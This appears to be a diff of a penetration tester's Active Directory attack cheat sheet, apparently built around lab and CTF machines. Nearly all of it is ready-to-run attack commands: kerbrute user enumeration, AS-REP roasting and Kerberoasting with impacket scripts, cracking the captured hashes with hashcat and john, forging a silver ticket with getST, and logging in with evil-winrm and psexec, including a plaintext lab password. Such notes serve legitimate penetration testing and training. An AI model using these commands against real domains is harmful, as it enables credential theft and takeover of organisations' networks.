@@ -208,18 +208,26 @@ Mangle More Users
 https://github.com/PinkDraconian/CTF-bash-tools
 ctf-wordlist-names allusers.txt
 
-Check for Valid AD Users
+===================================
+Check userlist for Valid AD Users
 kerbrute userenum -d mike.com --dc 192.168.200.5 formatted_name_wordlist.txt
 
-asrep-roastable
-Crack Users that dont require creds to request TGT from the KDC
-impacket-GetNPUsers mike.com/ -no-pass -usersfile users.txt
-john --wordlist=$rockyou asrephash.txt
+=================================== 
+Found Users (with no passwords)
 
+AS-REP Roast 
+Crack Users that dont require creds to request TGT from the KDC (likely a Service Acct) 
+
+impacket-GetNPUsers mike.com/ -no-pass -usersfile users.txt
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
+
+hashcat -m 18200 hash.kerb $rockyou --force 
+john --wordlist=$rockyou asrephash.txt
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice 
 
 
 ===================================
-Easy Roast (needs creds/hash/ticket) 
+Easy Roast (requires cred/hash/ticket) 
 
 echo "192.168.200.5 mike.com" >> /etc/hosts  
 GetUserSPNs.py -request domain/SVC_TGS  
@@ -236,7 +244,6 @@ Silver Ticket
 
 getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$   
 
-
  
 ===================================
 ASREP Roastable Users (no creds needed)
@@ -246,9 +253,24 @@ GetNPUsers.py domain/ -no-pass -usersfile userlist.txt
 GetNPUsers.py domain/ -usersfile mylist.txt -format john -outputfile asrep.txt -dc-ip 192.168.200.5 -debug 
 GetNPUsers.py domain/bob:pass -request -format john -outputfile asrep.txt
 john --wordlist=$rockyou --format=krb5asrep asrep.txt
+
+
+===================================  
+Kerberoast - Domain Creds Required 
   
+Get a list of service-usernames which are associated with normal user accounts 
+Also grabs Tickets for cracking. 
+Example: We have Creds for "active.htb/SVC_TGS" - We can find "Administrator" 
+  
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out 
+cat GetUserSPNs.out  
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37... 
+hashcat -m 13100 -a 0 GetUserSPNs.out $rockyou --force                                        
+psexec.py active.htb/administrator@10.10.10.100 
+
+
 ===================================
-Grab Kerberos Hashes 
+Kerberoast Powershell
 
 Import-Module ./Invoke-Kerberoast.ps1  
 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII khash0.txt  
